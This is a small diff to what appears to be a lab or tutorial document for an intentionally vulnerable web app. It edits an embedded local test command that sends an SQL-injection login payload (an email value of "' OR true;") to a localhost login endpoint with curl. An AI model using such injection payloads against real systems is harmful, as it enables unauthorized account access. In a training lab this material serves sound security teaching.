@@ -23,7 +23,7 @@ Then execute an SQL-injection by logging in with username/password shown below:
 
 <!-- test:exec
 # local test only: browser login using SQL-injection
-curl -s -o /dev/null -w '%{http_code}\n' -H 'Content-Type: application/json' -d "{\"email\":\"' OR true;\",\"password\":\"fail\"}" http://127.0.0.1:30080/rest/user/login
+curl -s -o /dev/null -w '%{http_code}\n' -H 'Content-Type: application/json' -H 'Origin: http://localhost:30080' -d "{\"email\":\"' OR true;\",\"password\":\"fail\"}" http://localhost:30080/rest/user/login
 -->
 
 
